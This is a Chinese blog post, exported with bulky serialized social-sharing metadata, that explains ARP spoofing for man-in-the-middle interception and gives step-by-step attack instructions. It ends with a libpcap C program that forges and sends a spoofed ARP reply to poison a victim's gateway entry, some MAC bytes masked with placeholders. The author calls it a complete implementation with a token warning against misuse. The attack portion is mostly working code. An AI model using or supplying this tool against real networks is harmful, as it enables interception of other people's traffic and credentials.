@@ -1,0 +1,153 @@
+---
+layout: post
+title: arp欺骗中间人攻击的实现、arp包解析
+categories:
+- program
+tags: []
+status: publish
+type: post
+published: true
+meta:
+  _oembed_e22489ad36e9e560a801a3600b301052: '{{unknown}}'
+  _oembed_a16c7d4bdbfe70a9a2c2d07b350a406e: '{{unknown}}'
+  _edit_last: '1'
+  _oembed_0b1f9e627c356fd214b9b1d768e15d64: '{{unknown}}'
+  _social_broadcast_content: 'a:1:{s:7:"twitter";a:1:{i:334092962;s:125:"arp欺骗中间人攻击的实现、arp包解析:
+    首先先是了解下什么arp欺骗 可以参加这... http://t.cn/zYDYTpo";}}'
+  _sinaweibo_sync: 'true'
+  _sinaweibo_sync_id: '3557981012499145'
+  _social_notify: '1'
+  _social_broadcast_meta: a:1:{s:7:"twitter";a:1:{i:334092962;a:0:{}}}
+  views: '25'
+  _social_aggregated_ids: a:2:{s:7:"twitter";a:0:{}s:8:"facebook";a:0:{}}
+  _social_broadcasted_ids: a:1:{s:7:"twitter";a:1:{i:334092962;a:1:{i:314309699950485504;a:3:{s:7:"message";s:3196:"eyJlbnRpdGllcyI6eyJoYXNodGFncyI6W10sInVzZXJfbWVudGlvbnMiOltdLCJ1cmxzIjpbeyJ1cmwiOiJodHRwOlwvXC90LmNvXC9nOGNxOXhFOGZxIiwiZGlzcGxheV91cmwiOiJ0LmNuXC96WURZVHBvIiwiZXhwYW5kZWRfdXJsIjoiaHR0cDpcL1wvdC5jblwvellEWVRwbyIsImluZGljZXMiOls0Niw2OF19XX0sImdlbyI6bnVsbCwidXNlciI6eyJpZF9zdHIiOiIzMzQwOTI5NjIiLCJpZCI6IjMzNDA5Mjk2MiIsImVudGl0aWVzIjp7InVybCI6eyJ1cmxzIjpbeyJ1cmwiOiJodHRwOlwvXC90LmNvXC9IbE5YOUpnVGZOIiwiZGlzcGxheV91cmwiOiJzbm9ybGF4LnNpbmFhcHAuY29tIiwiZXhwYW5kZWRfdXJsIjoiaHR0cDpcL1wvc25vcmxheC5zaW5hYXBwLmNvbSIsImluZGljZXMiOlswLDIyXX1dfSwiZGVzY3JpcHRpb24iOnsidXJscyI6W119fSwiZGVmYXVsdF9wcm9maWxlX2ltYWdlIjpmYWxzZSwicHJvZmlsZV9iYWNrZ3JvdW5kX2ltYWdlX3VybF9odHRwcyI6Imh0dHBzOlwvXC9zaTAudHdpbWcuY29tXC9pbWFnZXNcL3RoZW1lc1wvdGhlbWUxXC9iZy5wbmciLCJmb2xsb3dlcnNfY291bnQiOjksImNvbnRyaWJ1dG9yc19lbmFibGVkIjpmYWxzZSwibG9jYXRpb24iOm51bGwsInByb2ZpbGVfc2lkZWJhcl9ib3JkZXJfY29sb3IiOiJDMERFRUQiLCJmYXZvdXJpdGVzX2NvdW50IjowLCJzdGF0dXNlc19jb3VudCI6MzEsInRpbWVfem9uZSI6IkJlaWppbmciLCJnZW9fZW5hYmxlZCI6dHJ1ZSwidXRjX29mZnNldCI6Mjg4MDAsInByb2ZpbGVfYmFja2dyb3VuZF90aWxlIjpmYWxzZSwibmFtZSI6InNub3JsYXh6eHoiLCJsYW5nIjoiemgtY24iLCJwcm9maWxlX3NpZGViYXJfZmlsbF9jb2xvciI6IkRERUVGNiIsInByb2ZpbGVfaW1hZ2VfdXJsX2h0dHBzIjoiaHR0cHM6XC9cL3NpMC50d2ltZy5jb21cL3Byb2ZpbGVfaW1hZ2VzXC8zMzUyMzkwNjU5XC85NzNiZTE5NDg5ZGZjMzM5N2NiZTllMjU2MmEwMWNlM19ub3JtYWwuanBlZyIsImZyaWVuZHNfY291bnQiOjEwOSwiZm9sbG93X3JlcXVlc3Rfc2VudCI6ZmFsc2UsInByb3RlY3RlZCI6ZmFsc2UsInByb2ZpbGVfaW1hZ2VfdXJsIjoiaHR0cDpcL1wvYTAudHdpbWcuY29tXC9wcm9maWxlX2ltYWdlc1wvMzM1MjM5MDY1OVwvOTczYmUxOTQ4OWRmYzMzOTdjYmU5ZTI1NjJhMDFjZTNfbm9ybWFsLmpwZWciLCJkZWZhdWx0X3Byb2ZpbGUiOnRydWUsImlzX3RyYW5zbGF0b3IiOmZhbHNlLCJwcm9maWxlX2JhY2tncm91bmRfY29sb3IiOiJDMERFRUQiLCJjcmVhdGVkX2F0IjoiVHVlIEp1bCAxMiAxNToyODo0MCArMDAwMCAyMDExIiwiZm9sbG93aW5nIjpmYWxzZSwicHJvZmlsZV9iYWNrZ3JvdW5kX2ltYWdlX3VybCI6Imh0dHA6XC9cL2EwLnR3aW1nLmNvbVwvaW1hZ2VzXC90aGVtZXNcL3RoZW1lMVwvYmcucG5nIiwibGlzdGVkX2NvdW50IjoxLCJwcm9maWxlX2xpbmtfY29sb3IiOiIwMDg0QjQiLCJzY3JlZW5fbmFtZSI6IlpoYW5nWGluWmhlbmciLCJ1cmwiOiJodHRwOlwvXC90LmNvXC9IbE5YOUpnVGZOIiwidmVyaWZpZWQiOmZhbHNlLCJwcm9maWxlX3VzZV9iYWNrZ3JvdW5kX2ltYWdlIjp0cnVlLCJkZXNjcmlwdGlvbiI6ImFjZ1xccHl0aG9uXFxpb3MiLCJub3RpZmljYXRpb25zIjpmYWxzZSwicHJvZmlsZV90ZXh0X2NvbG9yIjoiMzMzMzMzIn0sInJldHdlZXRlZCI6ZmFsc2UsInBsYWNlIjpudWxsLCJyZXR3ZWV0X2NvdW50IjowLCJjb29yZGluYXRlcyI6bnVsbCwiaW5fcmVwbHlfdG9fc3RhdHVzX2lkIjpudWxsLCJpbl9yZXBseV90b19zY3JlZW5fbmFtZSI6bnVsbCwiZmF2b3JpdGVkIjpmYWxzZSwicG9zc2libHlfc2Vuc2l0aXZlIjpmYWxzZSwiaW5fcmVwbHlfdG9fc3RhdHVzX2lkX3N0ciI6bnVsbCwiaWRfc3RyIjoiMzE0MzA5Njk5OTUwNDg1NTA0IiwiY29udHJpYnV0b3JzIjpudWxsLCJ0cnVuY2F0ZWQiOmZhbHNlLCJ0ZXh0IjoiYXJwXHU2YjNhXHU5YTk3XHU0ZTJkXHU5NWY0XHU0ZWJhXHU2NTNiXHU1MWZiXHU3Njg0XHU1YjllXHU3M2IwXHUzMDAxYXJwXHU1MzA1XHU4OWUzXHU2NzkwOiBcdTk5OTZcdTUxNDhcdTUxNDhcdTY2MmZcdTRlODZcdTg5ZTNcdTRlMGJcdTRlYzBcdTRlNDhhcnBcdTZiM2FcdTlhOTcgXHU1M2VmXHU0ZWU1XHU1M2MyXHU1MmEwXHU4ZmQ5Li4uIGh0dHA6XC9cL3QuY29cL2c4Y3E5eEU4ZnEiLCJzb3VyY2UiOiI8YSBocmVmPVwiaHR0cHM6XC9cL3NvcHJlc3RvLm1haWxjaGltcC5jb21cIiByZWw9XCJub2ZvbGxvd1wiPlNvY2lhbCBQcm94eSBieSBNYWlsY2hpbXA8XC9hPiIsImNyZWF0ZWRfYXQiOiJXZWQgTWFyIDIwIDA5OjM3OjI2ICswMDAwIDIwMTMiLCJpbl9yZXBseV90b191c2VyX2lkX3N0ciI6bnVsbCwiaWQiOiIzMTQzMDk2OTk5NTA0ODU1MDQiLCJpbl9yZXBseV90b191c2VyX2lkIjpudWxsfQ==";s:4:"urls";a:2:{i:0;s:33:"http://snorlax.sinaapp.com/?p=298";i:1;s:0:"";}s:7:"account";O:8:"stdClass":1:{s:4:"user";O:8:"stdClass":38:{s:2:"id";s:9:"334092962";s:6:"id_str";s:9:"334092962";s:4:"name";s:10:"snorlaxzxz";s:11:"screen_name";s:13:"ZhangXinZheng";s:8:"location";s:0:"";s:3:"url";s:26:"http://snorlax.sinaapp.com";s:11:"description";s:12:"acgpythonios";s:9:"protected";s:1:"0";s:15:"followers_count";s:2:"10";s:13:"friends_count";s:3:"100";s:12:"listed_count";s:1:"1";s:10:"created_at";s:30:"Tue
+    Jul 12 15:28:40 +0000 2011";s:16:"favourites_count";s:1:"0";s:10:"utc_offset";s:5:"28800";s:9:"time_zone";s:7:"Beijing";s:11:"geo_enabled";s:1:"1";s:8:"verified";s:1:"0";s:14:"statuses_count";s:2:"14";s:4:"lang";s:5:"zh-cn";s:6:"status";a:11:{s:10:"created_at";s:30:"Fri
+    Mar 08 07:59:58 +0000 2013";s:2:"id";s:18:"309936517424484352";s:6:"id_str";s:18:"309936517424484352";s:4:"text";s:88:"关于编写高性能服务器的资料汇总(Linux)
+    | Ace's Blog http://t.co/CIFIvJkrru";s:6:"source";s:12:"Tweet Button";s:9:"truncated";s:1:"0";s:13:"retweet_count";s:1:"0";s:9:"favorited";s:1:"0";s:9:"retweeted";s:1:"0";s:18:"possibly_sensitive";s:1:"0";s:4:"lang";s:2:"zh";}s:20:"contributors_enabled";s:1:"0";s:13:"is_translator";s:1:"0";s:24:"profile_background_color";s:6:"C0DEED";s:28:"profile_background_image_url";s:47:"http://a0.twimg.com/images/themes/theme1/bg.png";s:34:"profile_background_image_url_https";s:49:"https://si0.twimg.com/images/themes/theme1/bg.png";s:23:"profile_background_tile";s:1:"0";s:17:"profile_image_url";s:90:"http://a0.twimg.com/profile_images/3352390659/973be19489dfc3397cbe9e2562a01ce3_normal.jpeg";s:23:"profile_image_url_https";s:92:"https://si0.twimg.com/profile_images/3352390659/973be19489dfc3397cbe9e2562a01ce3_normal.jpeg";s:18:"profile_link_color";s:6:"0084B4";s:28:"profile_sidebar_border_color";s:6:"C0DEED";s:26:"profile_sidebar_fill_color";s:6:"DDEEF6";s:18:"profile_text_color";s:6:"333333";s:28:"profile_use_background_image";s:1:"1";s:15:"default_profile";s:1:"1";s:21:"default_profile_image";s:1:"0";s:9:"following";s:1:"0";s:19:"follow_request_sent";s:1:"0";s:13:"notifications";s:1:"0";}}}}}}
+  _social_aggregation_log: a:8:{i:1363774976;O:8:"stdClass":1:{s:6:"manual";s:0:"";}i:1363779006;O:8:"stdClass":1:{s:6:"manual";s:0:"";}i:1363783241;O:8:"stdClass":1:{s:6:"manual";s:0:"";}i:1363798820;O:8:"stdClass":1:{s:6:"manual";s:0:"";}i:1363814596;O:8:"stdClass":1:{s:6:"manual";s:0:"";}i:1363892125;O:8:"stdClass":1:{s:6:"manual";s:0:"";}i:1363981090;O:8:"stdClass":1:{s:6:"manual";s:0:"";}i:1364154206;O:8:"stdClass":1:{s:6:"manual";s:0:"";}}
+author:
+  login: snorlax
+  email: zhangxzheng@hotmail.com
+  display_name: snorlax
+  first_name: ''
+  last_name: ''
+---
+<p>首先先是了解下什么arp欺骗 可以参加这篇文章http://www.ahstu.edu.cn/wlzx/HTML/20090923173022.shtml<br />
+看完这篇文章我们就可以实施攻击<br />
+1.首先登陆自己的路由器 先对自己准备攻击的机器获得mac地址的信息（在真正攻击时需要用嗅探广发同个子网下的arp广播来获得mac地址）<br />
+2.对被攻击的mac地址绑定静态ip（这步在真正攻击时并不需要、我只是为了方便）<br />
+3.在路由器中进行绑定把被攻击者的ip的绑定到攻击者的mac地址（在真正攻击时对路由器发送欺骗的ARP欺骗响应在之后会说到）<br />
+4.对被攻击者发送arp欺骗应答使之网关的mac地址映射到攻击者的机器上或者简单的 arp -s attack's mac gateway就可以了<br />
+------------------ARP表的设置基本完成----------------------------------------------------------------------------<br />
+接下去需要打开自己网卡的路由功能（这个可以简单的打开共享网络来做到)<br />
+然后开个wireshark什么就安安静静的看着来回所有的数据全给抓到就可以了:P<br />
+------------------上面只是理想情况是你知道路由器密码别的情况你该怎么办？被攻击的人能老老实实给你用他电脑么?------------<br />
+接下去我们要分析下arp数据包<a href="http://snorlax-wordpress.stor.sinaapp.com/uploads/2013/03/54A4717D-5EB0-4B9A-9D84-10A71FC0A72C.jpg"><img src="http://snorlax-wordpress.stor.sinaapp.com/uploads/2013/03/54A4717D-5EB0-4B9A-9D84-10A71FC0A72C.jpg" alt="" title="54A4717D-5EB0-4B9A-9D84-10A71FC0A72C" width="680" height="232" class="alignnone size-full wp-image-299" /></a><br />
+然后我从真实抓下来的arp进行分析<br />
+首先arp广播包是 42个字节<br />
+arp响应包是60个字节(后面18个我实在没搞明白是什么……反正我乱填也是成功就是的了<br />
+然后我贴代码对这42个字节进行具体分析<br />
+因为socket的封装都在ip之上的……unp上查到的sock_packet我在mac上死活也没找到= =<br />
+不过我发现给在数据连路层上的更好的一组东西:)<br />
+神器不解释啊= =<br />
+详见<br />
+http://dog.tele.jp/winpcapeng/html/group__wpcap__fn.html</p>
+<pre lang='c'>
+#include <stdlib.h>
+#include <stdio.h>
+
+#include <pcap.h>
+
+
+
+int main(int argc, char **argv) {
+    pcap_t *fp;
+    char error[PCAP_ERRBUF_SIZE];
+    u_char packet[60];
+    int i;
+    
+    /* Check the validity of the command line */
+    if (argc != 2)
+    {
+        printf("usage: %s inerface", argv[0]);
+        return -1;
+    }
+    
+    /* Open the output adapter */
+    if((fp = pcap_open_live("en0", 100, 1, 1000, error) ) == NULL)
+    {
+        fprintf(stderr,"\nError opening adapter: %s\n", error);
+        return -1;
+    }
+    
+    /* Supposing to be on ethernet, set mac destination to 1:1:1:1:1:1 */
+    /*被攻击者的mac*/
+    packet[0]=xx;
+    packet[1]=32;
+    packet[2]=102;
+    packet[3]=8;
+    packet[4]=jiubu;
+    packet[5]=gaosuni;
+    
+    /* set mac source to 2:2:2:2:2:2 */
+    /*攻击者的mac*/
+    packet[6]=jiu;
+    packet[7]=bu;
+    packet[8]=gaosu;
+    packet[9]=234;
+    packet[10]=xx;
+    packet[11]=100;
+    /*arp*/
+    packet[12]=8;
+    packet[13]=6;
+    /*arp首部*/
+    packet[14]=0;
+    packet[15]=1;
+    
+    packet[16]=8;
+    packet[17]=0;
+    
+    packet[18]=6;
+    packet[19]=4;
+    packet[20]=0;
+    packet[21]=2;
+    /*被骗的那个人的arp表上的假mac*/
+    packet[22]=jiu;
+    packet[23]=154;
+    packet[24]=32;
+    packet[25]=bu;
+    packet[26]=253;
+    packet[27]=gao;
+    /*被骗者的网关*/
+    packet[28]=192;
+    packet[29]=168;
+    packet[30]=1;
+    packet[31]=1;
+    /*被攻击者的mac*/
+    packet[32]=xx;
+    packet[33]=32;
+    packet[34]=102;
+    packet[35]=xx;
+    packet[36]=xx;
+    packet[37]=184;
+    /*被攻击者的ip*/
+    packet[38]=192;
+    packet[39]=168;
+    packet[40]=1;
+    packet[41]=114;
+    
+    /* Fill the rest of the packet */
+    /*乱填就好了*/
+    for(i=42;i<60;i++){
+        packet[i]=i%256;
+    }
+    
+    /* Send down the packet */
+    pcap_sendpacket(fp,
+                    packet,
+                    60);
+    
+    return 0;
+}
+</pre>
+<p>以上arp欺骗的完整实现、不要用来干坏事= =</p>
